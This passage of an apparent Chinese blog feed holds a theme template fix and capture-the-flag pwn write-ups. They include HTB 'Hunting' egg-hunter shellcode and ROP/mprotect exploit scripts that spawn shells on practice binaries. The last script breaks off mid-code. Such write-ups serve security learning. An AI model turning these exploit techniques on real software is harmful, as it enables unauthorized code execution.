title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>2.删除<code>&lt;span id=&quot;busuanzi_container_page_pv&quot; style=&#39;display:inline&#39;&gt;</code>和<code>&lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:inline&#39;&gt;</code>语句。</p><p>3.在<code>&lt;% if (theme.visit_counter.on) { %&gt;</code>语句后，添加<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     &lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">&lt;script async&#x3D;&quot;&quot; src&#x3D;&quot;https:&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">         &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                 &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">         &lt;&#x2F;div&gt;</span><br><span class="line">     &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>4.打开<code>after-footer.ejs</code>，删除<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。</summary>
    
    
    
    <category term="Yelee" scheme="lexsd6.github.io/categories/Yelee/"/>
    
    
    <category term="problem_resolve" scheme="lexsd6.github.io/tags/problem-resolve/"/>
    
    <category term="node-js" scheme="lexsd6.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>Hunting— HTB  PWN  challenge</title>
    <link href="lexsd6.github.io/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/"/>
    <id>lexsd6.github.io/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/</id>
    <published>2021-11-02T12:58:55.864Z</published>
    <updated>2021-11-03T06:32:40.926Z</updated>
    
    <content type="html"><![CDATA[<p>一道htb中，比较有意思的手写shellcode题。<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>如上，题目是一个32位程序，且保护只开了PIE并开放了读写执行权限。</p><p>分析程序主要流程我们可以看到：</p><p><img src="image-20211102210710626.png" alt="image-20211102210710626"></p><p>程序先mmap一段空间，将flag如这个空间中。</p><p>再用meset把flag原本存放的空间清零。</p><p>然后我们有大小为0x3c来写入我们的后门。</p><p>但是题目设置seccomp沙箱，禁用一些系统调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0002: 0x35 0x0a 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0003: 0x15 0x09 0x00 0x0000000b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x00000166  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000127  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000006  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000008  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000056  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000002  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x000000be  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>由于禁用了execve和open导致我们无法常规getshell或orw</p><p>但经过gdb，我们发现，由于开了PIE,flag的位置是随机的，但是flag位置大小于<code>0x60000000</code>.</p><p><img src="image-20211103102846331.png" alt="image-20211103102846331"></p><p>再进一步分析，可以看到flag在段地址开始的位置。所以我们以<code>0x1000</code>遍历地址，我们就可以发现flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gs 0x6b6d0000</span><br><span class="line">warning: Unable to display strings with size &#39;g&#39;, using &#39;b&#39; instead.</span><br><span class="line">0x6b6d0000:     &quot;HTB&#123;&quot;, &#39;X&#39; &lt;repeats 31 times&gt;, &quot;&#125;&quot;</span><br><span class="line">0x6b6d0025:     &quot;&quot;</span><br><span class="line">0x6b6d0026:     &quot;&quot;</span><br><span class="line">0x6b6d0027:     &quot;&quot;</span><br><span class="line">0x6b6d0028:     &quot;&quot;</span><br><span class="line">0x6b6d0029:     &quot;&quot;</span><br><span class="line">0x6b6d002a:     &quot;&quot;</span><br><span class="line">0x6b6d002b:     &quot;&quot;</span><br><span class="line">0x6b6d002c:     &quot;&quot;</span><br><span class="line">0x6b6d002d:     &quot;&quot;</span><br><span class="line">0x6b6d002e:     &quot;&quot;</span><br><span class="line">0x6b6d002f:     &quot;&quot;</span><br><span class="line">0x6b6d0030:     &quot;&quot;</span><br><span class="line">0x6b6d0031:     &quot;&quot;</span><br><span class="line">0x6b6d0032:     &quot;&quot;</span><br><span class="line">0x6b6d0033:     &quot;&quot;</span><br><span class="line">0x6b6d0034:     &quot;&quot;</span><br><span class="line">0x6b6d0035:     &quot;&quot;</span><br><span class="line">0x6b6d0036:     &quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="如何定位flag"><a href="#如何定位flag" class="headerlink" title="如何定位flag"></a>如何定位flag</h2><h3 id="access函数"><a href="#access函数" class="headerlink" title="access函数"></a>access函数</h3><p>经过查阅资料后我们可以发现access函数不仅可以判断某文件名是否存在还在可以判断某地址段是否存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access(<span class="keyword">const</span> <span class="keyword">char</span> *filename,<span class="keyword">int</span> mode);</span><br></pre></td></tr></table></figure><p>当mode 为0 时，判断是否存在。</p><p>当mode 为1时，判断是否有执行权限。</p><p>当mode 为2时，判断是否有写权限。</p><p>当mode 为3时，判断是否有读权限。</p><p>filename参数既可以传入文件名，也可以虚拟内存地址。</p><h3 id="for-循环查找"><a href="#for-循环查找" class="headerlink" title="for 循环查找"></a>for 循环查找</h3><p>由于用access函数，我们可以以<code>0x1000</code>为一个单位来慢慢遍历。</p><p>用c伪代码来表达就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> address = <span class="number">0x60000000</span>; address &lt; <span class="number">0x7fffffff</span>; address += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (access(address + i +<span class="number">4</span>) == EFAULT)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">1</span>, address, <span class="number">0x26</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用汇编来表达就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov edx,0x5fffffff;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">notaccess:</span><br><span class="line">or dx,0xfff;</span><br><span class="line">inc edx;</span><br><span class="line">mov eax,0x21;</span><br><span class="line">lea  ebx,[edx+4]</span><br><span class="line">int 0x80</span><br><span class="line">cmp eax,0xfffffff2;</span><br><span class="line">jz  notaccess;</span><br><span class="line">mov eax,0x04;</span><br><span class="line">mov ebx,1;</span><br><span class="line">mov ecx,edx;</span><br><span class="line">mov edx,0x26</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/02 19:51:09</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hunting'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'178.62.96.143'</span>,<span class="number">30132</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">shell=<span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx,0x5fffffff;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">notaccess:</span></span><br><span class="line"><span class="string">or dx,0xfff;</span></span><br><span class="line"><span class="string">inc edx;</span></span><br><span class="line"><span class="string">mov eax,0x21;</span></span><br><span class="line"><span class="string">lea  ebx,[edx+4]</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">cmp eax,0xfffffff2;</span></span><br><span class="line"><span class="string">jz  notaccess;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x04;</span></span><br><span class="line"><span class="string">mov ebx,1;</span></span><br><span class="line"><span class="string">mov ecx,edx;</span></span><br><span class="line"><span class="string">mov edx,0x26</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="知识点小记"><a href="#知识点小记" class="headerlink" title="知识点小记"></a>知识点小记</h2><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>有几个汇编指令搞忘了，在这里小记下。</p><p>lea  x,[y]</p><p>取y对应的地址作为x的值存入。</p><p>mov x,[y]</p><p>取y对应的地址的值作为x的值存入。</p><p>or  x,y</p><p>对x,y进行或运算，并将值存入x中。</p><p>xor x,y</p><p>xor异或运算,当x,y两个不同时结果为1,否则为0.在汇编中有时也用于清零操作，例如 <code>xor eax,eax</code> 清空eax寄存器。</p><h3 id="延长程序时间"><a href="#延长程序时间" class="headerlink" title="延长程序时间"></a>延长程序时间</h3><p>在看大佬博客<a href="https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。" target="_blank" rel="noopener">https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alarm(<span class="keyword">unsigned</span> <span class="keyword">int</span> seconds);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;一道htb中，比较有意思的手写shellcode题。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>xman的leve5另一种解法(mprotect)学习与利用</title>
    <link href="lexsd6.github.io/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>lexsd6.github.io/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2021-10-20T02:58:44.000Z</published>
    <updated>2021-10-20T03:31:19.407Z</updated>
    
    <content type="html"><![CDATA[<p>当时在xman听大佬将leve5利用时，很疑惑要调用mprotect，明明可以溢出执行<code>system(&#39;/bin/sh&#39;)</code>了. 直到我遇到些奇怪的静态编译题,我真香了故小记一下<a id="more"></a></p><h2 id="mprotect-函数"><a href="#mprotect-函数" class="headerlink" title="mprotect()函数"></a><code>mprotect()</code>函数</h2><p>在Linux中，<code>mprotect()</code>函数可以用来修改一段指定内存区域的保护属性。mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>使用方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><p>常规使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(addr, len, <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p>start表示一块代码段的起始位置。</p><p>len表示要修改长度，len的大小如果过小，libc会自动来补齐的。</p><p>port 表示权限 即使读（4）写（2）执行（1）</p><h2 id="leve5-exp"><a href="#leve5-exp" class="headerlink" title="leve5 exp"></a>leve5 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./level3_x64'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'node4.buuoj.cn'</span>,<span class="number">26162</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="number">0x88</span>*<span class="string">'1'</span>+p64(<span class="number">0x0000000004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(e.got[<span class="string">'read'</span>])+p64(<span class="number">1</span>)+p64(<span class="number">0x000000000400690</span>)+<span class="string">'s'</span>*<span class="number">8</span>*<span class="number">7</span>+p64(e.sym[<span class="string">'vulnerable_function'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr=p.recvuntil('\x7f')[:-6].ljust(8,'\x00')</span></span><br><span class="line">addr=u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex((addr)))</span><br><span class="line">x=finder(<span class="string">'read'</span>,addr)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">p.sendline(0x88*'1'+p64(0x00000000004006b3)+p64(x.dump('str_bin_sh'))+p64(x.dump('system')))</span></span><br><span class="line"><span class="string">#addr=0x00600000</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">rdx=<span class="number">0x00000000000cb1cd</span>+x.libcbase</span><br><span class="line">rdi=<span class="number">0x0000000000026796</span>+x.libcbase</span><br><span class="line">rsi=<span class="number">0x000000000002890f</span>+x.libcbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#p.sendline(0x88*'1'+p64(rdi)+p64(0x00600a00)+p64(rsi)+p64(0x100000)+p64(rdx)+p64(7)+p64(x.dump('mprotect'))+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))</span></span><br><span class="line">p.sendline(<span class="number">0x88</span>*<span class="string">'1'</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(<span class="number">0x1000</span>)+p64(rdx)+p64(<span class="number">7</span>)+p64(x.dump(<span class="string">'mmap'</span>))+<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))</span></span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br></pre></td></tr></table></figure><h2 id="利用机会-get-started-3dsctf-2016"><a href="#利用机会-get-started-3dsctf-2016" class="headerlink" title="利用机会-get_started_3dsctf_2016"></a>利用机会-get_started_3dsctf_2016</h2><p>一般情况下mprotect的使用都用点画蛇添足，但是在一些静态编译的题目中就是很有用的。比如：get_started_3dsctf_2016</p><p>这道题是32位的，静态编译中ban了system，但是给mprotect了。由于没有开PIE，我们可以将可控的一段程序写入读写执行权限，然后写入后门，来得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   2exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/10/19 13:33:42</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./get_started_3dsctf_2016'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'node4.buuoj.cn'</span>,<span class="number">29847</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">gets=<span class="number">0x804f630</span></span><br><span class="line">edi_ret=<span class="number">0x0805099d</span></span><br><span class="line">addr=<span class="number">0x080ea900</span></span><br><span class="line">eax_ret=<span class="number">0x080b91e6</span></span><br><span class="line">ebx_ret=<span class="number">0x080481ad</span></span><br><span class="line">edx_ret=<span class="number">0x0806fc0a</span></span><br><span class="line">ret=<span class="number">0x08048196</span></span><br><span class="line">int80=<span class="number">0x0806d7e5</span></span><br><span class="line">ebx_edx_ret=<span class="number">0x0806fc09</span></span><br><span class="line">write=<span class="number">0x806e1b0</span></span><br><span class="line"><span class="comment">#0x080557ab : mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#0x080d8443 : xchg dword ptr [edx], ecx ; ret</span></span><br><span class="line"><span class="comment">#0x08048a26 : xchg eax, ecx ; ret 交换</span></span><br><span class="line"><span class="comment">#0x08048880 : mov ebx, dword ptr [esp] ; ret</span></span><br><span class="line">ecx_write_edxaddr=<span class="number">0x080557ab</span></span><br><span class="line"><span 